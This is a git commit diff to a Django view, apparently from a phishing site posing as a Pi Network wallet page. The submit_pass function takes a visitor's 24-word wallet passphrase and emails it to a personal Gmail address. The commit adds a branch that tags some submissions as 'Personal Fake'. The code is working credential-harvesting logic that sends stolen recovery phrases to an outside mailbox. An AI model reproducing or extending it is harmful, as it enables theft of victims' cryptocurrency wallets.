37ec5c20b872a2e9675ced42ff7d7a884de71efc
Ezekiel--dev <81721664+Easy-creator@users.noreply.github.com>
2024-02-29 09:13:42 +0100

    something

--- loader/views.py
+++ loader/views.py
@@ -80,7 +80,10 @@ def submit_pass(request):
         keys = request.POST.get('mf-text', '')
         words = keys.split()
         if len(words) != 24:
-            send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
+            if my_site:
+                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
+            else:
+                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
             messages.error(request, 'Invalid Passphrase')
             return redirect('/wallet/')
 
